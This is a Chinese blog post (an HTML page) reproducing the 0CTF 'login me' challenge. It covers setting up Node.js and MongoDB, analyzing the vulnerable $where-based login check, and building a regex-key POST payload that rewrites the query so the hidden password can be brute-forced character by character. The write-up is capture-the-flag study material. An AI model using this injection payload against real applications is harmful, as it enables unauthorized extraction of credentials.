@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：https://xz.aliyun.com/t/2300                  https://coxxs.me/676 本地环境 ubuntu16.04 ####mongodb搭建其他基本操作可看此文章：https://www.jianshu.com/p/8fd5632e4e35 sudo apt-get install mongodb//安装mongodb service">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/ctf记录/复现0ctf-login-me(nodejs+mongodb).html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://xz.aliyun.com/t/2300                  https://coxxs.me/676 本地环境 ubuntu16.04 ####mongodb搭建其他基本操作可看此文章：https://www.jianshu.com/p/8fd5632e4e35 sudo apt-get install mongodb//安装mongodb service">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-a9e79383dc978e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-1cb36fe123a2e1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-2043f76a5ef2d5b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-02T02:24:09.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：https://xz.aliyun.com/t/2300                  https://coxxs.me/676 本地环境 ubuntu16.04 ####mongodb搭建其他基本操作可看此文章：https://www.jianshu.com/p/8fd5632e4e35 sudo apt-get install mongodb//安装mongodb service">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-a9e79383dc978e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/ctf记录/复现0ctf-login-me(nodejs+mongodb).html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>CTF记录</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/复现0ctf-login-me(nodejs+mongodb).html/">复现0CTF-LOGIN-ME(NODEJS+MONGODB).HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献：<a href="https://xz.aliyun.com/t/2300" target="_blank" rel="noopener">https://xz.aliyun.com/t/2300</a><br>                  <a href="https://coxxs.me/676" target="_blank" rel="noopener">https://coxxs.me/676</a></p>
+<p>本地环境 ubuntu16.04</p>
+<p>####mongodb搭建<br>其他基本操作可看此文章：<a href="https://www.jianshu.com/p/8fd5632e4e35" target="_blank" rel="noopener">https://www.jianshu.com/p/8fd5632e4e35</a></p>
+<pre><code>sudo apt-get install mongodb//安装mongodb
+service mongodb start//启动mongodb服务
+mongo//进入mongo
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/5035860-a9e79383dc978e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p>####安装nodejs</p>
+<pre><code>sudo apt-get install nodejs
+sudo apt-get install npm
+</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/5035860-1cb36fe123a2e1fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p>使用node指令，发现报错</p>
+<pre><code>apt install nodejs-legacy
+</code></pre><p>####启动服务<br>启动我们的index.js文件</p>
+<pre><code>node index.js
+</code></pre><p>发现模块没安装(和python差不多)，于是装模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install express</span><br><span class="line">npm install moment</span><br><span class="line">npm install mongodb</span><br><span class="line">npm install body-parser</span><br></pre></td></tr></table></figure></p>
+<p>####题目源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">//引入模块，类似python（引入`express，body-parser，path，moment`模块）</span><br><span class="line">var express = require(&apos;express&apos;)</span><br><span class="line">var app = express()</span><br><span class="line">var bodyParser = require(&apos;body-parser&apos;)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;&#125;));</span><br><span class="line">var path    = require(&quot;path&quot;);</span><br><span class="line">var moment = require(&apos;moment&apos;);</span><br><span class="line"></span><br><span class="line">//nodejs与mongodb的连接</span><br><span class="line">var MongoClient = require(&apos;mongodb&apos;).MongoClient;</span><br><span class="line">var url = &quot;mongodb://localhost:27017/&quot;;</span><br><span class="line"></span><br><span class="line">MongoClient.connect(url, function(err, db) &#123;</span><br><span class="line">    if (err) throw err;</span><br><span class="line">    dbo = db.db(&quot;test_db&quot;);</span><br><span class="line">    var collection_name = &quot;users&quot;;</span><br><span class="line">    var password_column = &quot;password_&quot;+Math.random().toString(36).slice(2)</span><br><span class="line">    var password = &quot;XXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">    // flag is flag&#123;password&#125;</span><br><span class="line">    var myobj = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;last_access&quot;: moment().format(&apos;YYYY-MM-DD HH:mm:ss Z&apos;)&#125;;</span><br><span class="line">    myobj[password_column] = password;</span><br><span class="line">    dbo.collection(collection_name).remove(&#123;&#125;);</span><br><span class="line">    dbo.collection(collection_name).update(</span><br><span class="line">        &#123; name: myobj.name &#125;,</span><br><span class="line">        myobj,</span><br><span class="line">        &#123; upsert: true &#125;</span><br><span class="line">    );</span><br><span class="line">    app.get(&apos;/&apos;, function (req, res) &#123;</span><br><span class="line">        res.sendFile(path.join(__dirname,&apos;index.html&apos;));</span><br><span class="line">    &#125;)</span><br><span class="line">    app.post(&apos;/check&apos;, function (req, res) &#123;</span><br><span class="line">        var check_function = &apos;if(this.username == #username# &amp;&amp; #username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.&apos;+password_column+&apos;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;&apos;;</span><br><span class="line">        for(var k in req.body)&#123;</span><br><span class="line">            var valid = [&apos;#&apos;,&apos;(&apos;,&apos;)&apos;].every((x)=&gt;&#123;return req.body[k].indexOf(x) == -1&#125;);</span><br><span class="line">            if(!valid) res.send(&apos;Nope&apos;);</span><br><span class="line">            check_function = check_function.replace(</span><br><span class="line">                new RegExp(&apos;#&apos;+k+&apos;#&apos;,&apos;gm&apos;)</span><br><span class="line">                ,JSON.stringify(req.body[k]))</span><br><span class="line">        &#125;</span><br><span class="line">        var query = &#123;&quot;$where&quot; : check_function&#125;;</span><br><span class="line">        var newvalue = &#123;$set : &#123;last_access: moment().format(&apos;YYYY-MM-DD HH:mm:ss Z&apos;)&#125;&#125;</span><br><span class="line">        dbo.collection(collection_name).updateOne(query,newvalue,function (e,r)&#123;</span><br><span class="line">            if(e) throw e;</span><br><span class="line">            res.send(&apos;ok&apos;);</span><br><span class="line">            // ... implementing, plz dont release this.</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    app.listen(8081)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>####源码分析</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;)</span><br><span class="line">var app = express()</span><br><span class="line">var bodyParser = require(&apos;body-parser&apos;)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;&#125;));</span><br><span class="line">var path = require(&quot;path&quot;);</span><br><span class="line">var moment = require(&apos;moment&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>引入模块，类似python（引入<code>express，body-parser，path，moment</code>模块）</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var MongoClient = require(&apos;mongodb&apos;).MongoClient;</span><br><span class="line">var url = &quot;mongodb://localhost:27017/&quot;;</span><br><span class="line">nodejs与mongodb连接</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>与数据库连接<br>*<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MongoClient.connect(url, function(err, db) &#123;</span><br><span class="line">    if (err) throw err;</span><br><span class="line">    dbo = db.db(&quot;test_db&quot;);</span><br><span class="line">    var collection_name = &quot;users&quot;;</span><br><span class="line">    var password_column = &quot;password_&quot;+Math.random().toString(36).slice(2)</span><br><span class="line">    var password = &quot;XXXXXXXXXXXXXXXXXXXXXX&quot;;</span><br><span class="line">    // flag is flag&#123;password&#125;</span><br><span class="line">    var myobj = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;last_access&quot;: moment().format(&apos;YYYY-MM-DD HH:mm:ss Z&apos;)&#125;;</span><br><span class="line">    myobj[password_column] = password;</span><br></pre></td></tr></table></figure></p>
+<p>与数据库连接上后，可知：<br>数据库名：test_db<br>数据表名：users<br>列名：①username<br> ② last_access(<strong>其中moment().format(‘YYYY-MM-DD HH:mm:ss Z’)是查看当前时间，类似<code>2018-05-12 16:49:50</code></strong>)<br>③password（<strong>其中Math.random().toString(36).slice(2)是生成一段随机文本，生成后类似<code>password_dr6e3wjsjn5c23xr</code>，password就是flag</strong>）</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dbo.collection(collection_name).remove(&#123;&#125;);</span><br><span class="line">   dbo.collection(collection_name).update(</span><br><span class="line">       &#123; name: myobj.name &#125;,</span><br><span class="line">       myobj,</span><br><span class="line">       &#123; upsert: true &#125;</span><br><span class="line">   );</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>把之前的都删了，然后更新成最新的。所以，password这一列的列名每个人都不一样，但是对应的flag不会变，给注入加大了难度，即<em>无列名注入</em></p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.get(&apos;/&apos;, function (req, res) &#123;</span><br><span class="line">        res.sendFile(path.join(__dirname,&apos;index.html&apos;));</span><br><span class="line">    &#125;)</span><br><span class="line">    app.post(&apos;/check&apos;, function (req, res) &#123;</span><br><span class="line">        var check_function = &apos;if(this.username == #username# &amp;&amp; #username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.&apos;+password_column+&apos;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;&apos;;</span><br><span class="line">        for(var k in req.body)&#123;</span><br><span class="line">            var valid = [&apos;#&apos;,&apos;(&apos;,&apos;)&apos;].every((x)=&gt;&#123;return req.body[k].indexOf(x) == -1&#125;);</span><br><span class="line">            if(!valid) res.send(&apos;Nope&apos;);</span><br><span class="line">            check_function = check_function.replace(</span><br><span class="line">                new RegExp(&apos;#&apos;+k+&apos;#&apos;,&apos;gm&apos;)</span><br><span class="line">                ,JSON.stringify(req.body[k]))</span><br><span class="line">        &#125;</span><br><span class="line">        var query = &#123;&quot;$where&quot; : check_function&#125;;</span><br><span class="line">        var newvalue = &#123;$set : &#123;last_access: moment().format(&apos;YYYY-MM-DD HH:mm:ss Z&apos;)&#125;&#125;</span><br><span class="line">        dbo.collection(collection_name).updateOne(query,newvalue,function (e,r)&#123;</span><br><span class="line">            if(e) throw e;</span><br><span class="line">            res.send(&apos;ok&apos;);</span><br><span class="line">            // ... implementing, plz dont release this.</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>两个路由：<br>①<code>get路由</code>就是直接访问这个页面，会打印index.html的源代码<br>②<code>post路由</code>就是一个拼接，大致上就是看post的<code>username</code>和<code>password</code>是否带有危险参数<code>&#39;#&#39;,&#39;(&#39;,&#39;)&#39;</code>，携带了就返回nope，若未携带，则进行拼接查询，将结果的<code>last_access</code>时间更改为最新的，然后返回ok</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.listen(8081)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>服务端口，即服务在8081端口上</p>
+<p>####攻击点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for(var k in req.body)&#123;</span><br><span class="line">           //恶意字符检测:</span><br><span class="line">            var valid = [&apos;#&apos;,&apos;(&apos;,&apos;)&apos;].every((x)=&gt;&#123;return req.body[k].indexOf(x) == -1&#125;);</span><br><span class="line">            if(!valid) res.send(&apos;Nope&apos;);</span><br><span class="line"></span><br><span class="line">            check_function = check_function.replace(</span><br><span class="line">                new RegExp(&apos;#&apos;+k+&apos;#&apos;,&apos;gm&apos;)</span><br><span class="line">                ,JSON.stringify(req.body[k]))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-2043f76a5ef2d5b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>则<code>req.body</code>是一个键值数组，而<code>k</code>是键名</p>
+<p><code>new RegExp(&#39;#&#39;+k+&#39;#&#39;,&#39;gm&#39;)</code>，<strong>其中<code>g</code>全局匹配；<code>m</code>多行，让开始和结束字符（^ 和 $）工作在多行模式工作（例如，^ 和 $ 可以匹配字符串中每一行的开始和结束（行是由 \n 或 \r 分割的），而不只是整个输入字符串的最开始和最末尾处</strong></p>
+<p>合起来就是匹配<code>#键名#</code>这样的字符串，然后格式化一下<code>JSON.stringify(req.body[k])</code>，即用值代替。（例如<code>#username#</code>这样的字符串就被替换成了值<code>admin</code>）</p>
+<p>####正则<br>将其中的 <code>... &amp;&amp; hex_md5(#password#) == this.password_column){ ...</code>替换为以下形式中的一种，以便进行逐位爆破：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">... &amp;&amp; #password# == this.password_column.substr( ... ))&#123; ... // 无法替换出 ( )，放弃</span><br><span class="line">... &amp;&amp; #password# &lt;= this.password_column)&#123; ... // &lt;= 左右会出现引号，无法处理，放弃</span><br><span class="line">... &amp;&amp; #password# &lt;= this[&quot;password_column&quot;])&#123; ... // &lt;= 左右会出现引号，但可以用作 &quot;password&quot; 和 &quot;password_column&quot; 中的引号，可以尝试</span><br></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;%3F%28%3F%3D%5C%29%7B%29%7C1=%5D%20%2B&amp;%3F%3D%3D%20this.%7C1=%3C%3Dthis%5B&amp;%3Fhex.%2A%3Frd.%2A%3F%22%7C1=9&amp;%3F%22%28%3F%3D%5C%29%29%7C1=&amp;%3F0%3B%7C1=skysec.top&amp;%3Fskysec.top%7C1=%2Ba%2B</span><br></pre></td></tr></table></figure></p>
+<p>解码后我们得到的<code>req.body</code>为:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;username&apos;:&apos;admin&apos;,&apos;?(?=\\)&#123;)|1&apos;:&apos;] +&apos;,&apos;?== this.|1&apos;:&apos;&lt;=this[&apos;,&apos;?hex.*?rd.*?&quot;|1&apos;:&apos;123&apos;,&apos;?&quot;(?=\\))|1&apos;:&apos;&apos;,&apos;?0;|1&apos;:&apos;skysec.top&apos;,&apos;?skysec.top|1&apos;:&apos;+a+&apos;</span><br></pre></td></tr></table></figure></p>
+<p>键名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">①?(?=\)&#123;)|1</span><br><span class="line">②?== this.|1</span><br><span class="line">③?hex.*?rd.*?&quot;|1</span><br><span class="line">④?&quot;(?=\\))|1</span><br><span class="line">⑤?0;|1</span><br><span class="line">⑥?skysec.top|1</span><br></pre></td></tr></table></figure></p>
+<p><strong>?….|1</strong>：</p>
+<ul>
+<li>其中<code>?</code>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符，这里的<code>?</code>用于匹配前面的<code>#</code></li>
+<li><code>....</code>是自己构造的正则</li>
+<li><code>|</code>指明两项之间的一个选择，所以<code>|1</code>即如果前面匹配成功，则不再往后匹配</li>
+</ul>
+<p>所以，这样就导致<code>#</code>对自己填写的正则无任何作用，作用的一直是自己构造的正则</p>
+<p>①?(?=){)|1</p>
+<ul>
+<li>即去掉外层包裹为<code>(?=\){)</code>，去掉转义为<code>(?=){)</code>，再去掉最外面包裹的括号为<code>?=){</code>（断言，只匹配一个位置）<br>这里即匹配<code>){</code>，它的值为<code>] +</code></li>
+</ul>
+<p>那么check_fuction（<code>if(this.username == #username# &amp;&amp; #username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.&#39;+password_column+&#39;){\nreturn 1;\n}else{\nreturn 0;}</code>）变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.password_6ya2mt945d9jatt9&quot;] +&quot;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><em>为构造<code>this[&quot;password_column&quot;]</code>铺垫</em></p>
+<p>②?== this.|1</p>
+<ul>
+<li>去掉外层包裹为<code>== this.</code>，即匹配<code>== this.</code>这个字符串<br>它的值为<code>&lt;=this[</code></li>
+</ul>
+<p>那么<code>check_fuction</code>变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; hex_md5(#password#) &quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><em>构造出比较符<code>&lt;=</code>，并且彻底闭合<code>this[&quot;password_column&quot;]</code></em></p>
+<p>③?hex.<em>?rd.</em>?”|1</p>
+<ul>
+<li>去掉外层包裹为<code>hex.*?rd.*?&quot;</code>，这里是匹配<code>hex_md5(#password#)</code><br>它的值为<code>123</code><br>那么<code>check_fuction</code>变为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; &quot;123&quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><em>将<code>hex_md5</code>直接替换成任意值，即想要注出的<code>password</code></em></p>
+<p>④?”(?=\))|1</p>
+<ul>
+<li>去掉外层包裹为<code>&quot;(?=\\))</code>，去掉转义为<code>&quot;(?=\))</code>（断言）<br>那么这里只想匹配双引号，并且是后面有)的双引号，它的值为<code>&quot;&quot;</code></li>
+</ul>
+<p>那么<code>check_fuction</code>变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; &quot;123&quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;&quot;)&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><em>这一步的作用即闭合引号</em></p>
+<p>⑤?0;|1</p>
+<ul>
+<li>去掉外层包裹为<code>0;</code>，就是匹配<code>0;</code><br>它的值为<code>skysec.top</code></li>
+</ul>
+<p>那么<code>check_function</code>变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; &quot;123&quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;&quot;)&#123;\nreturn 1;\n&#125;else&#123;return\n&quot;skysec.top&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><em>这一步的作用就是将return后的值变成一个特殊字符(skysec.top)</em></p>
+<p>⑥?skysec.top|1</p>
+<ul>
+<li>去掉外层包裹为<code>skysec.top</code>，即匹配<code>skysec.top</code>字符串<br>它的值<code>&#39;+a+&#39;</code></li>
+</ul>
+<p>那么<code>check_function</code>变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; &quot;123&quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;&quot;)&#123;?skysec.top|1</span><br><span class="line"></span><br><span class="line">去掉外层包裹</span><br><span class="line"></span><br><span class="line">skysec.top</span><br><span class="line"></span><br><span class="line">即匹配skysec.top字符串</span><br><span class="line">然后替换为值</span><br><span class="line"></span><br><span class="line">&apos;+a+&apos;</span><br><span class="line"></span><br><span class="line">最后我们得到的check_function为</span><br><span class="line"></span><br><span class="line">if(this.username == &quot;admin&quot; &amp;&amp; &quot;admin&quot; == &quot;admin&quot; &amp;&amp; &quot;123&quot;&lt;=this[&quot;password_6ya2mt945d9jatt9&quot;] +&quot;&quot;)&#123;\nreturn 1;\n&#125;else&#123;return\n &quot;&quot;+a+&quot;&quot;&#125;</span><br></pre></td></tr></table></figure></p>
